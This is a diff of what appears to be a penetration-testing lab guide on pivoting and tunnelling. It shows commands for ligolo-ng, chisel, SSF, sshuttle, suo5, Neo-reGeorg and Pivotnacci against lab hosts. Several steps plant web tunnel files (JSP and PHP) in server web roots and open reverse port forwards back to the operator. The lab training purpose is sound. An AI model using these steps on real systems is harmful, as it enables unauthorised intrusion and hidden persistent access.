@@ -442,7 +442,6 @@ listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
 cd tools/ligolo-ng
 	#Let us double-check that we are trying to access nginx using our ligolo interface
 ip route get 10.X.20.221
-	ip route get 10.X.20.221
 scp agent root@nginx:
 ssh root@nginx 'chmod +x agent'
 ssh root@nginx './agent -connect lamp:11601 -accept-fingerprint <FINGERPRINT_FROM_THE_SERVER>
@@ -612,7 +611,7 @@ curl tom:8080
 
 lsof -i tcp:9050
 	#Check to see that we don't have anything listening on port 9050
-tools/chisel/chisel client tom:80 9050:socks &
+~/tools/chisel/chisel client tom:80 9050:socks &
 lsof -i tcp:9050
 	#Check to see that we have chisel listening on 9050
 
@@ -633,7 +632,7 @@ cat /tmp/PROOF
 ```
 [[ Chisel~LocalForward ]]*
 lsof -i tcp:9999
-tools/chisel/chisel client tom:80 9999:linux:80 &
+~/tools/chisel/chisel client tom:80 9999:linux:80 &
 lsof -i tcp:9999
 ```
 
@@ -652,7 +651,7 @@ cat /tmp/PROOF
 [[ Chisel~RemoteForward ]]*
 ssh root@tom ss -punta | grep 8888
 	#check to see if the port is open
-tools/chisel/chisel client tom:80 R:8888:127.0.0.1:4444 &
+~/tools/chisel/chisel client tom:80 R:8888:127.0.0.1:4444 &
 ssh root@tom ss -punta | grep 8888
 	#check to see if the port is open again
 ```
@@ -677,7 +676,7 @@ ssh root@tom pkill chisel
 
 ```
 [[ SSF~Prep ]]*
-cd tools/ssf-linux-x86_64-3.0.0
+cd tools/ssf/ssf-linux-x86_64-3.0.0
 ```
 
 #### modify config.json file
@@ -688,7 +687,7 @@ cd tools/ssf-linux-x86_64-3.0.0
 [[ SSF~Prep ]]
 openssl req -newkey rsa:4096 -nodes -keyout private.key -out certificate.csr
 openssl rsa -in private.key -out private.key -aes256 -passout pass:passphrase
-openssl dhparam 4096 -outform PEM -out dh4096.pem
+openssl dhparam  -outform PEM -out dh4096.pem
 openssl req -x509 -nodes -newkey rsa:4096 -keyout ca.key -out ca.crt -days 3650
 
 cat << EOF > extfile.txt
@@ -756,7 +755,7 @@ cat /tmp/PROOF
 ### clean up sshuttle
 
 ```
-[[ SSHUTTLE~Kali ]]
+[[ sshuttle~Kali ]]
 sudo pkill sshuttle
 sudo iptables -t nat -nvL
 ```
@@ -766,8 +765,9 @@ sudo iptables -t nat -nvL
 ```
 [[ SUO5~Demo ]]*
 cd tools/suo5
-cat suo5.jsp | ssh root@lamp "cat - | sudo tee /usr/share/tomcat/webapps/ROOT/suo5.jsp"
-./suo5-linux-amd64 -t http://lamp:8080/suo5.jsp
+cat assets/java/suo5.jsp | ssh root@tom "cat - | sudo tee /usr/share/tomcat/webapps/ROOT/suo5.jsp"
+chmod +x suo5-linux-amd64
+./suo5-linux-amd64 -t http://tom:8080/suo5.jsp
 ```
 
 ## Neo-reGeorg
@@ -776,9 +776,9 @@ cat suo5.jsp | ssh root@lamp "cat - | sudo tee /usr/share/tomcat/webapps/ROOT/su
 [[ NeoreGeorg~Demo ]]*
 cd tools/Neo-reGeorg
 ./neoreg.py generate -k password
-cat neoreg_servers/tunnel.php | ssh -o StrictHostKeyChecking=no root@10.X.20.220 'cat - |sudo tee /var/www/html/tunnel.php'
+cat neoreg_servers/tunnel.php | ssh -o StrictHostKeyChecking=no root@lamp 'cat - |sudo tee /var/www/html/tunnel.php'
 
-./neoreg.py -k password -u http://10.X.20.220/tunnel.php --php -vvv
+./neoreg.py -k password -u http://lamp/tunnel.php --php -vvv
 ```
 
 ### Pivotnacci
@@ -786,8 +786,8 @@ cat neoreg_servers/tunnel.php | ssh -o StrictHostKeyChecking=no root@10.X.20.220
 ```
 [[ Pivotnacci~Demo ]]*
 cd tools/pivotnacci
-cat agents/agent.php | ssh -o StrictHostKeyChecking=no root@10.X.20.220 'cat - |sudo tee /var/www/html/tunnel.php'
-./pivotnacci http://10.X.20.220/tunnel.php --verbose
+cat agents/agent.php | ssh -o StrictHostKeyChecking=no root@lamp 'cat - |sudo tee /var/www/html/tunnel.php'
+./pivotnacci http://lamp/tunnel.php --verbose
 ```
 
 ### Exploitation
